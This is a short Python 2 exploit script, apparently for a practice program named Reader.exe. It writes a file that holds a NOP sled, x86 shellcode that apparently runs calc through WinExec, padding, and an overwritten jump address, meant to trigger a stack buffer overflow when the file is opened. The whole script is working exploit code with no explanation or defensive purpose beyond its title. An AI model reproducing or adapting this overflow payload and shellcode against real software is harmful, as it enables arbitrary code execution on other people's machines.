# Reader.exe Exploit by hyunmini
import struct

print "[+] Creat text file..."

SHELLCODE  = "\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24\x89\x54\x24\x50\x89\x7C\x24\x54\x89\x74\x24\x58\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\x83\xEC\x08\x8B\x54\x24\x50\x8B\x7C\x24\x54\x8B\x74\x24\x58\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x45\x78\x69\x74\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7"


print "Shellcode Length :", len(SHELLCODE)

NOP = "\x90" * 50
DUMMY = "A" * (508-len(NOP+SHELLCODE))
JMP = "\x05\x10"
#JMP = "\x43\x43\x43\x43"
contents = NOP + SHELLCODE + DUMMY + JMP
 
f = open("test.txt","w")
f.write(contents)
f.close()
